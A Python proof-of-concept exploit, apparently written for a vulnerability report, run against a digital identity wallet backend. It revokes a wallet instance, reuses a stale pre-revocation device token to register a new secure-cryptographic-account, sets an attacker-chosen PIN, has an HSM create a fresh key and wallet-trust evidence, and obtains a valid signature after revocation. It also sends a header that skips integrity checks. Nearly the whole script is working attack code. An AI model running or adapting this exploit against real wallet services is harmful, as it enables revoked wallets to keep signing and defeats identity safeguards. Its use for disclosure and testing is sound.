#!/usr/bin/env python3
import base64
import hashlib
import json
import os
import sys
import time
from typing import Dict, List, Tuple

import requests
from cryptography.exceptions import InvalidSignature
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import ec, utils

BASE = os.environ.get("POC_BASE_URL", "http://127.0.0.1:8080").rstrip("/")
TIMEOUT = 20


def b64(data: bytes) -> str:
    return base64.b64encode(data).decode("ascii")


def pub_der_b64(key: ec.EllipticCurvePrivateKey) -> str:
    return b64(
        key.public_key().public_bytes(
            serialization.Encoding.DER,
            serialization.PublicFormat.SubjectPublicKeyInfo,
        )
    )


def compact_json(obj) -> bytes:
    return json.dumps(obj, separators=(",", ":"), ensure_ascii=False).encode("utf-8")


def content_digest(body: bytes) -> str:
    return f"sha-256=:{b64(hashlib.sha256(body).digest())}:"


def signature_input(fields: List[str], key_id: str, created: int) -> str:
    fields_token = " ".join(f'"{field}"' for field in fields)
    return (
        f"({fields_token});keyid=\"{key_id}\";"
        f'alg="ecdsa-p256-sha256";created={created}'
    )


def signature_base(
    method: str,
    path: str,
    headers: Dict[str, str],
    fields: List[str],
    sig_input: str,
) -> str:
    lines = []
    for field in fields:
        lower = field.lower()
        if lower == "@method":
            lines.append(f'"@method": {method.upper()}')
        elif lower == "@path":
            lines.append(f'"@path": {path}')
        else:
            value = next(
                (v for k, v in headers.items() if k.lower() == lower),
                None,
            )
            if value is None:
                raise RuntimeError(f"Missing signed header: {field}")
            lines.append(f'"{lower}": {value}')
    lines.append(f'"@signature-params": {sig_input}')
    return "\n".join(lines)


def make_signatures(
    method: str,
    path: str,
    headers: Dict[str, str],
    specs: List[Tuple[str, str, List[str], ec.EllipticCurvePrivateKey]],
) -> Dict[str, str]:
    created = int(time.time())
    inputs = []
    sigs = []
    for label, key_id, fields, private_key in specs:
        sig_input = signature_input(fields, key_id, created)
        base = signature_base(method, path, headers, fields, sig_input)
        signature = private_key.sign(base.encode("utf-8"), ec.ECDSA(hashes.SHA256()))
        inputs.append(f"{label}={sig_input}")
        sigs.append(f"{label}=:{b64(signature)}:")
    return {
        "Signature-Input": ",".join(inputs),
        "Signature": ",".join(sigs),
    }


def call(
    method: str,
    path: str,
    *,
    headers: Dict[str, str] | None = None,
    body: bytes | None = None,
    expected: Tuple[int, ...] = (200,),
) -> requests.Response:
    response = requests.request(
        method,
        BASE + path,
        headers=headers or {},
        data=body,
        timeout=TIMEOUT,
    )
    if response.status_code not in expected:
        print(f"\nFAIL {method} {path}: HTTP {response.status_code}", file=sys.stderr)
        print(response.text[:5000], file=sys.stderr)
        raise SystemExit(1)
    return response


def challenge(path: str, field: str) -> str:
    return call("POST", path).json()[field]


def signed_request(
    method: str,
    path: str,
    headers: Dict[str, str],
    specs: List[Tuple[str, str, List[str], ec.EllipticCurvePrivateKey]],
    *,
    body_obj=None,
    expected=(200,),
) -> requests.Response:
    body = None
    signed_headers = dict(headers)
    if body_obj is not None:
        body = compact_json(body_obj)
        signed_headers["Content-Type"] = "application/json"
        signed_headers["Content-Digest"] = content_digest(body)
    signed_headers.update(make_signatures(method, path, signed_headers, specs))
    return call(method, path, headers=signed_headers, body=body, expected=expected)


MDVM_REGISTER_FIELDS = ["@method", "@path", "auth-challenge", "content-digest"]
WPB_REGISTER_FIELDS = ["@method", "@path", "auth-challenge", "mdvm-token"]
RWSCA_REGISTER_FIELDS = ["@method", "@path", "auth-challenge", "mdvm-token"]
RWSCA_DELETE_FIELDS = [
    "@method", "@path", "rwsca-account-id", "auth-challenge", "mdvm-token"
]
RWSCA_INIT_PIN_FIELDS = [
    "@method", "@path", "content-digest", "rwsca-account-id", "auth-challenge", "mdvm-token"
]
RWSCA_CREATE_KEYS_FIELDS = [
    "@method", "@path", "content-digest", "rwsca-account-id", "auth-challenge", "mdvm-token"
]
RWSCA_SIGN_DATA_FIELDS = [
    "@method", "@path", "content-digest", "rwsca-account-id", "auth-challenge",
    "mdvm-token", "rwsca-pin-session-token"
]


def main():
    print("=== RWSCA post-revocation first-registration E2E PoC ===")
    mdvm_key = ec.generate_private_key(ec.SECP256R1())

    print("[1/8] Register MDVM and retain pre-revocation token")
    mdvm_challenge = challenge("/v1/mdvm/challenge", "mdvm_auth_challenge")
    mdvm_body = {
        "wi_device_class": {
            "systemVersion": "18.0",
            "model": "iPhone",
            "hardwareModel": "iPhone15,2",
            "identifierForVendor": "00000000-0000-0000-0000-000000000001",
            "uname": "Darwin",
            "osVersion": "18.0",
        },
        "wi_mdvm_auth_pubk": pub_der_b64(mdvm_key),
        "pap_devicecheck_attestation": "",
        "pap_devicecheck_assertion": "",
    }
    mdvm_headers = {
        "Auth-Challenge": mdvm_challenge,
        "Skip-Integrity-Checks": "all",
    }
    mdvm_response = signed_request(
        "POST", "/v1/mdvm/ios/register", mdvm_headers,
        [("mdvm-auth-sig", "wi-mdvm-auth-key", MDVM_REGISTER_FIELDS, mdvm_key)],
        body_obj=mdvm_body,
    ).json()
    mdvm_id = mdvm_response["mdvm_wi_id"]
    stale_mdvm_token = mdvm_response["mdvm_token"]
    print(f"    mdvm_wi_id={mdvm_id}")

    print("[2/8] Register WPB and save revocation code")
    wpb_challenge = challenge("/v1/wpb/challenge", "wpb_auth_challenge")
    wpb_headers = {
        "Auth-Challenge": wpb_challenge,
        "Mdvm-Token": stale_mdvm_token,
    }
    wpb_response = signed_request(
        "POST", "/v1/wpb/register", wpb_headers,
        [("wpb-auth-sig", "wi-mdvm-auth-key", WPB_REGISTER_FIELDS, mdvm_key)],
    ).json()
    wpb_id = wpb_response["wpb_wi_id"]
    revocation_code = wpb_response["wpb_wi_revocation_code"]
    print(f"    wpb_wi_id={wpb_id}")

    print("[3/8] Keep RWSCA absent before wallet revocation")
    initial_rwsca = "NO_PREEXISTING_RWSCA_ACCOUNT"
    print("    pre_revocation_rwsca_account=ABSENT")

    print("[4/8] Revoke Wallet Instance through WPB")
    revoke_body = compact_json({"wpb_wi_revocation_code": revocation_code})
    call(
        "POST",
        "/v1/wpb/revoke",
        headers={"Content-Type": "application/json"},
        body=revoke_body,
        expected=(202, 200),
    )
    print("    revocation request accepted")

    # The workflow waits for the RWSCA Kafka consumer to log UNKNOWN_HANDLE
    # before invoking the post-revocation half of this script.
    marker = os.environ.get("POC_PHASE_MARKER")
    if marker:
        with open(marker, "w", encoding="utf-8") as f:
            json.dump(
                {
                    "mdvm_token": stale_mdvm_token,
                    "mdvm_private_key": base64.b64encode(
                        mdvm_key.private_bytes(
                            serialization.Encoding.DER,
                            serialization.PrivateFormat.PKCS8,
                            serialization.NoEncryption(),
                        )
                    ).decode("ascii"),
                    "initial_rwsca": initial_rwsca,
                    "mdvm_id": mdvm_id,
                    "wpb_id": wpb_id,
                },
                f,
            )
        print("PHASE1_COMPLETE")
        return

    post_revocation(stale_mdvm_token, mdvm_key, initial_rwsca)


def load_phase2(path: str):
    with open(path, "r", encoding="utf-8") as f:
        state = json.load(f)
    mdvm_key = serialization.load_der_private_key(
        base64.b64decode(state["mdvm_private_key"]), password=None
    )
    return state, mdvm_key


def post_revocation(stale_mdvm_token, mdvm_key, initial_rwsca):
    print("[5/8] FIRST-register RWSCA AFTER revocation using the PRE-REVOCATION MDVM token")
    challenge_value = challenge("/v1/rwsca/challenge", "rwsca_auth_challenge")
    headers = {
        "Auth-Challenge": challenge_value,
        "Mdvm-Token": stale_mdvm_token,
    }
    new_rwsca = signed_request(
        "POST", "/v1/rwsca/register", headers,
        [("rwsca-auth-sig", "wi-mdvm-auth-key", RWSCA_REGISTER_FIELDS, mdvm_key)],
    ).json()["rwsca_account_id"]
    if new_rwsca == initial_rwsca:
        raise SystemExit("FAIL: expected a newly-created RWSCA account id")
    print(f"    new_rwsca_account_id={new_rwsca}")

    print("[6/8] Initialize attacker-chosen PIN factor")
    pin_key = ec.generate_private_key(ec.SECP256R1())
    init_challenge = challenge("/v1/rwsca/challenge", "rwsca_auth_challenge")
    init_headers = {
        "Rwsca-Account-Id": new_rwsca,
        "Auth-Challenge": init_challenge,
        "Mdvm-Token": stale_mdvm_token,
    }
    init_response = signed_request(
        "POST",
        "/v1/rwsca/initializePinAndStartPinSession",
        init_headers,
        [
            ("rwsca-auth-sig", "wi-mdvm-auth-key", RWSCA_INIT_PIN_FIELDS, mdvm_key),
            ("rwsca-pin-sig", "wi-rwsca-pin-key", RWSCA_INIT_PIN_FIELDS, pin_key),
        ],
        body_obj={"wi_rwsca_pin_pubk": pub_der_b64(pin_key)},
    ).json()
    pin_session_token = init_response["rwsca_pin_session_token"]
    print("    new PIN session issued")

    print("[7/8] Create fresh HSM-backed key and WTE after revocation")
    keys_challenge = challenge("/v1/rwsca/challenge", "rwsca_auth_challenge")
    keys_headers = {
        "Rwsca-Account-Id": new_rwsca,
        "Auth-Challenge": keys_challenge,
        "Mdvm-Token": stale_mdvm_token,
    }
    nonce = b64(os.urandom(32))
    keys_response = signed_request(
        "POST",
        "/v1/rwsca/createKeys",
        keys_headers,
        [("rwsca-auth-sig", "wi-mdvm-auth-key", RWSCA_CREATE_KEYS_FIELDS, mdvm_key)],
        body_obj={"number_of_keys": 1, "pp_c_nonce": nonce},
    ).json()
    key_info = keys_response["rwsca_wi_keys"][0]
    wrapped = key_info["rwsca_wi_wrapped_prvk"]
    public_der = base64.b64decode(key_info["rwscd_wi_pubk"])
    wte = keys_response["rwsca_wte"]
    print(f"    WTE issued (len={len(wte)})")

    print("[8/8] Ask RWSCA HSM to sign data after wallet revocation")
    data_hash = hashlib.sha256(b"RWSCA post-revocation E2E PoC").digest()
    sign_challenge = challenge("/v1/rwsca/challenge", "rwsca_auth_challenge")
    sign_headers = {
        "Rwsca-Account-Id": new_rwsca,
        "Rwsca-Pin-Session-Token": pin_session_token,
        "Auth-Challenge": sign_challenge,
        "Mdvm-Token": stale_mdvm_token,
    }
    sign_response = signed_request(
        "POST",
        "/v1/rwsca/signData",
        sign_headers,
        [("rwsca-auth-sig", "wi-mdvm-auth-key", RWSCA_SIGN_DATA_FIELDS, mdvm_key)],
        body_obj={
            "rwsca_wi_wrapped_prvk": wrapped,
            "wi_key_binding_data_hash": b64(data_hash),
        },
    ).json()
    signature = base64.b64decode(sign_response["rwscd_key_binding_signature"])

    public_key = serialization.load_der_public_key(public_der)
    try:
        public_key.verify(
            signature,
            data_hash,
            ec.ECDSA(utils.Prehashed(hashes.SHA256())),
        )
    except InvalidSignature:
        raise SystemExit("FAIL: HSM signature did not verify")
    print("    signature verification: SUCCESS")

    print()
    print("CONFIRMED_E2E:")
    print("RWSCA accepted its FIRST registration and performed a cryptographically valid HSM-backed signature AFTER Wallet Instance revocation")
    print("pre_revocation_rwsca_account=false")
    print(f"post_revocation_rwsca_account_id={new_rwsca}")
    print("post_revocation_first_registration=true")\n    print("stale_mdvm_token_reused=true")
    print("new_pin_initialized=true")
    print("new_hsm_key_created=true")
    print("new_wte_issued=true")
    print("post_revocation_signature_verified=true")


if __name__ == "__main__":
    phase2 = os.environ.get("POC_PHASE2_STATE")
    if phase2:
        state, key = load_phase2(phase2)
        post_revocation(state["mdvm_token"], key, state["initial_rwsca"])
    else:
        main()
